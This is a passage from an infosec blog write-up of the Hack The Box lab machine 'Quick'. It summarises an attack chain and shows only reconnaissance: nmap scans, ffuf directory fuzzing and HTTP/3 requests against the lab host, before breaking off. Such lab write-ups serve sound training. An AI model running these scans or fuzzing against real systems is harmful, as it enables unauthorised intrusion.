<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Hackthebox Quick Writeup | Vibhu025</title><meta name="generator" content="Jekyll v4.0.1" /><meta property="og:title" content="Hackthebox Quick Writeup" /><meta name="author" content="Vibhu Bansal" /><meta property="og:locale" content="en_US" /><meta name="description" content="Information:~$" /><meta property="og:description" content="Information:~$" /><link rel="canonical" href="https://vibhu025.github.io/posts/htb-quick/" /><meta property="og:url" content="https://vibhu025.github.io/posts/htb-quick/" /><meta property="og:site_name" content="Vibhu025" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-05-24T20:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Quick Writeup" /><meta name="twitter:site" content="@vibhu_bansal_" /><meta name="twitter:creator" content="@Vibhu Bansal" /><meta name="google-site-verification" content="5xMZIhlSB7kY8SbDl6jvkENHoVeMk03mpzOaOe0gj0U" /> <script type="application/ld+json"> {"@type":"BlogPosting","url":"https://vibhu025.github.io/posts/htb-quick/","headline":"Hackthebox Quick Writeup","dateModified":"2020-05-24T20:00:00+05:30","datePublished":"2020-05-24T20:00:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"https://vibhu025.github.io/posts/htb-quick/"},"author":{"@type":"Person","name":"Vibhu Bansal"},"description":"Information:~$","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/main.css"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script> window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>'); </script> <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="style" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/syntax.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/syntax.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/owner/avatar.jpg" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">Vibhu025</a></div><div id="site-subtitle" class="font-italic">Infosec Blog</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/timeline/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>TIMELINE</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT ME</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <a href="https://hackthebox.eu/profile/270629" target="_blank"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/vibhu-bansal" target="_blank"> <i class="fab fa-linkedin-in"></i> </a> <a href="https://github.com/Vibhu025" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/vibhu_bansal_" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="javascript:window.open('mailto:' + ['Vibhu025','gmail.com'].join('@'))"> <i class="fas fa-envelope"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Quick Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Quick Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Sun, May 24, 2020, 8:00 PM +0530"> May 24, 2020 <i class="unloaded">2020-05-24T20:00:00+05:30</i> </span> by <span class="author"> Vibhu Bansal </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Jul 8, 2020, 2:46 PM +0530"> Jul 8, 2020 <i class="unloaded">2020-07-08T14:46:34+05:30</i> </span></div></div><div class="post-content"> <img src="/assets/img/post/hackthebox/quick/main.png"><h1 id="information">Information:~$</h1><table><thead><tr><th>Title<th style="text-align: center">Details<tbody><tr><td>Name<td style="text-align: center">Quick<tr><td>IP<td style="text-align: center">10.10.10.186<tr><td>Difficulty<td style="text-align: center">Hard<tr><td>Points<td style="text-align: center">40<tr><td>OS<td style="text-align: center">Linux<tr><td>Creator<td style="text-align: center"><a href="https://www.hackthebox.eu/home/users/profile/13531">MrR3boot</a></table><h1 id="brief">Brief:~$</h1><p>Quick is Hard Rated Linux box. Intial Nmap <code class="highlighter-rouge">UDP</code> scan reveals a PORT 443 running <code class="highlighter-rouge">HTTP/3</code> Using <code class="highlighter-rouge">quiche</code> to make a request to quick.htb and we get a <code class="highlighter-rouge">pdf</code> file and a password. Using <code class="highlighter-rouge">WFUZZ</code> on login page we get right <code class="highlighter-rouge">email</code> from the custom email-list. After login on <code class="highlighter-rouge">Capturing</code> the request give us a information about the <code class="highlighter-rouge">Esigate</code> on which the web-app is based. Exploiting the service with <code class="highlighter-rouge">XSLT-Injection</code> to gain Initial Foothold. Reading some internal files gives us information about a subdomain <code class="highlighter-rouge">printerv2.quick.htb</code> and a login name and password which can be used on subdomain giving us access to <code class="highlighter-rouge">printing functionality</code> which can be exploited to do <code class="highlighter-rouge">priv esec</code>using which we get <code class="highlighter-rouge">private-ssh</code> keys for user srvadm And reviewing the <code class="highlighter-rouge">~/.cache</code> dir we got file contains a url with has a password in it url-decode and login as root</p><h1 id="reconnaisance">Reconnaisance:~$</h1><h1 id="nmap-scan">Nmap Scan:~$</h1><h2 id="tcp-scan">TCP Scan:~$</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/initial 10.10.10.186
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.80 scan initiated Tue May 19 10:10:41 2020 as: nmap -sC -sV -oN nmap/initial 10.10.10.186</span>
Nmap scan report <span class="k">for </span>quick.htb <span class="o">(</span>10.10.10.186<span class="o">)</span>
Host is up <span class="o">(</span>0.20s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 <span class="o">(</span>RSA<span class="o">)</span>
|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e <span class="o">(</span>ED25519<span class="o">)</span>
9001/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Quick | Broadband Services
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Tue May 19 10:12:52 2020 -- 1 IP address (1 host up) scanned in 131.89 seconds</span>
</pre></table></code></div></div><h2 id="udp-scan">UDP Scan:~$</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sU</span> <span class="nt">-oN</span> nmap/udpscan 10.10.10.186
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.80 scan initiated Thu May 21 12:01:36 2020 as: nmap -sC -sU -p 443 -oN nmap/udpscan 10.10.10.186</span>
Nmap scan report <span class="k">for </span>quick.htb <span class="o">(</span>10.10.10.186<span class="o">)</span>
Host is up <span class="o">(</span>1.1s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE         SERVICE
443/udp open|filtered https

<span class="c"># Nmap done at Thu May 21 12:02:17 2020 -- 1 IP address (1 host up) scanned in 40.81 seconds</span>
</pre></table></code></div></div><p>We get 3 ports open 22(SSH), 9001(HTTP), 443(HTTPS)</p><p>In this case Port 443 is ruuning on HTTP/3 as it is in UDP</p><p>Let’s Start with <code class="highlighter-rouge">Port 9001</code></p><p><img src="/assets/img/post/hackthebox/quick/1.png" alt="Quick" /></p><p><img src="/assets/img/post/hackthebox/quick/2.png" alt="Quick" /></p><p>Not much We got a <code class="highlighter-rouge">Login</code> page and <code class="highlighter-rouge">Clients</code> page and Few Potential users</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre> ~/htb/boxes/Quick <span class="o">&gt;&gt;</span> ffuf <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://quick.htb:9001/FUZZ.php

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://quick.htb:9001/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

index                   [Status: 200, Size: 3351, Words: 354, Lines: 126]
home                    [Status: 200, Size: 86, Words: 2, Lines: 1]
search                  [Status: 200, Size: 1, Words: 1, Lines: 2]
login                   [Status: 200, Size: 4345, Words: 451, Lines: 209]
clients                 [Status: 200, Size: 2698, Words: 234, Lines: 112]
db                      [Status: 200, Size: 0, Words: 1, Lines: 1]
ticket                  [Status: 200, Size: 86, Words: 2, Lines: 1]
</span></pre></table></code></div></div><p>Nothing New</p><p>Move onto <code class="highlighter-rouge">Port 443</code></p><p>To access HTTP/3 Protocol we are going to use Quic Protocol</p><p>There are 2 ways to do it</p><ol><li>We can Use <a href="https://github.com/cloudflare/quiche">Quiche</a> From Cloudfare</li><li><a href="https://github.com/yurymuski/curl-http3">Docker</a> Image of <code class="highlighter-rouge">curl</code> compiled with <code class="highlighter-rouge">quiche/0.2.0</code> for HTTP/3 Support</li></ol><h3 id="method-1">Method 1:~$</h3><p>Git clone and install quiche and follow the instruction to make a request https://quick.htb</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre>~/Downloads/quiche &gt;&gt; cargo run --manifest-path=tools/apps/Cargo.toml --bin quiche-client -- --no-verify  https:/quick.htb/
Finished dev [unoptimized + debuginfo] target(s) in 0.22s
     Running `tools/apps/target/debug/quiche-client --no-verify 'https:/quick.htb/'`

<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;title&gt;</span> Quick | Customer Portal<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;h1&gt;</span>Quick | Portal<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;style&gt;</span>
<span class="nt">ul</span> <span class="p">{</span>
  <span class="nl">list-style-type</span><span class="p">:</span> <span class="nb">none</span><span class="p">;</span>
  <span class="nl">margin</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
  <span class="nl">padding</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
  <span class="nl">width</span><span class="p">:</span> <span class="m">200px</span><span class="p">;</span>
  <span class="nl">background-color</span><span class="p">:</span> <span class="m">#f1f1f1</span><span class="p">;</span>
<span class="p">}</span>

<span class="nt">li</span> <span class="nt">a</span> <span class="p">{</span>
  <span class="nl">display</span><span class="p">:</span> <span class="nb">block</span><span class="p">;</span>
  <span class="nl">color</span><span class="p">:</span> <span class="m">#000</span><span class="p">;</span>
  <span class="nl">padding</span><span class="p">:</span> <span class="m">8px</span> <span class="m">16px</span><span class="p">;</span>
  <span class="nl">text-decoration</span><span class="p">:</span> <span class="nb">none</span><span class="p">;</span>
<span class="p">}</span>

<span class="c">/* Change the link color on hover */</span>
<span class="nt">li</span> <span class="nt">a</span><span class="nd">:hover</span> <span class="p">{</span>
  <span class="nl">background-color</span><span class="p">:</span> <span class="m">#555</span><span class="p">;</span>
  <span class="nl">color</span><span class="p">:</span> <span class="no">white</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;p&gt;</span> Welcome to Quick User Portal<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;ul&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=contact"</span><span class="nt">&gt;</span>Contact<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=about"</span><span class="nt">&gt;</span>About<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=docs"</span><span class="nt">&gt;</span>References<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
<span class="nt">&lt;/ul&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>Let’s try to access these pages</p><p>contact</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;h1&gt;</span>Quick | Contact<span class="nt">&lt;/h1&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"fname"</span><span class="nt">&gt;</span>First Name<span class="nt">&lt;/label&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"fname"</span> <span class="na">name=</span><span class="s">"firstname"</span> <span class="na">placeholder=</span><span class="s">"Your name.."</span><span class="nt">&gt;</span>

    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"lname"</span><span class="nt">&gt;</span>Last Name<span class="nt">&lt;/label&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"lname"</span> <span class="na">name=</span><span class="s">"lastname"</span> <span class="na">placeholder=</span><span class="s">"Your last name.."</span><span class="nt">&gt;</span>

    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"country"</span><span class="nt">&gt;</span>Country<span class="nt">&lt;/label&gt;</span>
    <span class="nt">&lt;select</span> <span class="na">id=</span><span class="s">"country"</span> <span class="na">name=</span><span class="s">"country"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"australia"</span><span class="nt">&gt;</span>Australia<span class="nt">&lt;/option&gt;</span>
      <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"canada"</span><span class="nt">&gt;</span>Canada<span class="nt">&lt;/option&gt;</span>
      <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"usa"</span><span class="nt">&gt;</span>USA<span class="nt">&lt;/option&gt;</span>
    <span class="nt">&lt;/select&gt;</span>

    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"subject"</span><span class="nt">&gt;</span>Subject<span class="nt">&lt;/label&gt;</span>
    <span class="nt">&lt;textarea</span> <span class="na">id=</span><span class="s">"subject"</span> <span class="na">name=</span><span class="s">"subject"</span> <span class="na">placeholder=</span><span class="s">"Write something.."</span> <span class="na">style=</span><span class="s">"height:200px"</span><span class="nt">&gt;&lt;/textarea&gt;</span>

    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>about</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"about-section"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;h1&gt;</span>Quick | About Us <span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">style=</span><span class="s">"text-align:center"</span><span class="nt">&gt;</span>Our Team<span class="nt">&lt;/h2&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"column"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/w3images/team1.jpg"</span> <span class="na">alt=</span><span class="s">"Jane"</span> <span class="na">style=</span><span class="s">"width:100%"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;h2&gt;</span>Jane Doe<span class="nt">&lt;/h2&gt;</span>
        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"title"</span><span class="nt">&gt;</span>CEO <span class="err">&amp;</span> Founder<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;p&gt;</span>Quick Broadband services established in 2012 by Jane.<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;p&gt;</span>jane@quick.htb<span class="nt">&lt;/p&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>

